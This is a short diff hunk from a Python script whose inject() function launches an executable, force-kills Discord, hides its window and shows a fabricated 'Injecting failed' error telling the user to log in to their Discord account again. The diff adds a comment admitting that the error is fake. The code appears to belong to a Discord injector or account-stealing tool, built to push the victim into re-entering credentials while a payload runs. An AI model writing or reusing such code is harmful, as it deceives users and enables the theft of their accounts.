@@ -22,6 +22,7 @@ def inject():
                     os.startfile(abspath+os.sep+_dir+'.exe')
                     os.system("taskkill /f /im  Discord.exe")
                     root.withdraw()
+                    # shows a fake error message
                     messagebox.showerror('Injecting failed', 'Error: Please relog in your discord account and try again')
 
 if __name__ == "__main__":
